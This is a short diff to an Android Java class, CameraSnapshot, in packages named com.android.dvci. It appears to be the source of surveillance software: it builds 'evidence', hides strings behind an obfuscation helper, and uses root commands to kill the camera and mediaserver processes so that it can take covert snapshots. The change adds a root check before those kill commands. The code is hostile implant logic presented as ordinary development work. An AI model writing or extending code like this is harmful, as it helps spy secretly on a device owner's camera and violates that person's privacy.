@@ -26,6 +26,7 @@ import android.opengl.GLES20;
 import android.os.Build;
 import android.util.Log;
 
+import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.listener.ListenerProcess;
@@ -339,12 +340,19 @@ public class CameraSnapshot {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (snapshot), something wrong with camera? WTF kill it for nth" + camera_killed + "times");
 		}
+
+		if(!Status.haveRoot()){
+			camera_killed++;
+			return;
+		}
+
 		String pid_cam = Utils.pidOf(M.e("camera"));
 		String pid_ms = Utils.pidOf(M.e("mediaserver"));
 		try {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (snapshot) try to kill " + pid_cam);
 			}
+
 			Execute.executeRoot("kill " + pid_cam);
 			if (kill_also_mediaserver) {
 				if (Cfg.DEBUG) {
